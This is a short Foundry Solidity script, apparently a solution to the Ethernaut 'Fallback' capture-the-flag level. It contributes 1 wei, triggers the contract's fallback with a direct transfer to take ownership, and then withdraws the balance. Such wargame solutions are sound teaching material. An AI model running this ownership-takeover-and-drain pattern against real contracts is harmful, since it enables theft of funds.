// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../instances/Ilevel01.sol";

contract Attacker is Script {
    Fallback level1 = Fallback(payable(0x855341e66393E51fd26d9E0756cf9798A2E69F3D));

    function run() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        level1.getContribution();
        address(level1).call{value: 1 wei}("");
        level1.owner();
        level1.withdraw();

        vm.stopBroadcast();
    }
}
